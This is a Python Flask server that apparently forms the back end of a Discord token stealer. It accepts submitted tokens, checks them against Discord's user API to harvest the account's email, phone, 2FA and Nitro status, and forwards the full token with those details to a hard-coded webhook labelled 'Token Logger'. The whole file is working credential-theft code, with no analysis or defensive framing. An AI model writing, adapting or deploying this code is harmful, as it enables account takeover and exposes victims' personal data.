from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK', 'https://discord.com/api/webhooks/1469196049858957425/h49L6NNy9XMHLhhUe372RfL5Dwzvbk9JSb8pEb7BP1hgV7UehmMvWH4Zav559t8V2tFj')

@app.route('/api/token', methods=['POST'])
def handle_token():
    try:
        data = request.json
        token = data.get('token', '').strip()
        
        if not token:
            return jsonify({'error': 'No token'}), 400
        
        print(f"Token received: {token[:30]}...")
        
        # Check with Discord API
        headers = {'Authorization': token}
        response = requests.get('https://discord.com/api/v9/users/@me', 
                               headers=headers, timeout=10)
        
        if response.status_code == 200:
            user = response.json()
            user_info = {
                'valid': True,
                'username': f"{user.get('username', 'Unknown')}#{user.get('discriminator', '0')}",
                'id': user.get('id'),
                'email': user.get('email', 'No email'),
                'verified': user.get('verified', False),
                'phone': user.get('phone', 'No phone'),
                'mfa': user.get('mfa_enabled', False),
                'nitro': 'Yes' if user.get('premium_type') else 'No',
                'locale': user.get('locale', 'Unknown'),
                'avatar': f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png" if user.get('avatar') else None
            }
        else:
            user_info = {'valid': False, 'error': f'HTTP {response.status_code}'}
        
        # Send to Discord WITH FULL TOKEN
        send_to_discord(token, user_info)
        
        return jsonify({'message': 'Processed'}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

def send_to_discord(token, user_info):
    """Send embed to Discord with FULL TOKEN"""
    
    if user_info.get('valid'):
        # ✅ VALID TOKEN - Show everything
        embed = {
            'title': '🎯 VALID TOKEN FOUND!',
            'color': 0x00ff00,
            'description': f'**Full Token:**\n```{token}```',
            'fields': [
                {'name': '👤 Username', 'value': user_info['username'], 'inline': True},
                {'name': '🆔 User ID', 'value': user_info['id'], 'inline': True},
                {'name': '📧 Email', 'value': user_info['email'], 'inline': True},
                {'name': '✅ Verified', 'value': 'Yes' if user_info['verified'] else 'No', 'inline': True},
                {'name': '📱 Phone', 'value': user_info['phone'], 'inline': True},
                {'name': '🔐 2FA', 'value': 'Enabled' if user_info['mfa'] else 'Disabled', 'inline': True},
                {'name': '💎 Nitro', 'value': user_info['nitro'], 'inline': True},
                {'name': '🌍 Locale', 'value': user_info['locale'], 'inline': True},
                {'name': '⏰ Time', 'value': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'inline': True}
            ]
        }
        
        if user_info.get('avatar'):
            embed['thumbnail'] = {'url': user_info['avatar']}
            
    else:
        # ❌ INVALID TOKEN
        embed = {
            'title': '❌ INVALID TOKEN',
            'color': 0xff0000,
            'description': f'**Full Token:**\n```{token}```',
            'fields': [
                {'name': 'Error', 'value': user_info.get('error', 'Unknown'), 'inline': False},
                {'name': 'Time', 'value': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'inline': False}
            ]
        }
    
    payload = {
        'username': 'Token Logger',
        'avatar_url': 'https://cdn.discordapp.com/attachments/123456789012345678/123456789012345678/nyx_logo.png',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("Sent to Discord webhook")
    except Exception as e:
        print(f"Failed to send to Discord: {e}")

@app.route('/')
def home():
    return jsonify({'status': 'running'})

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
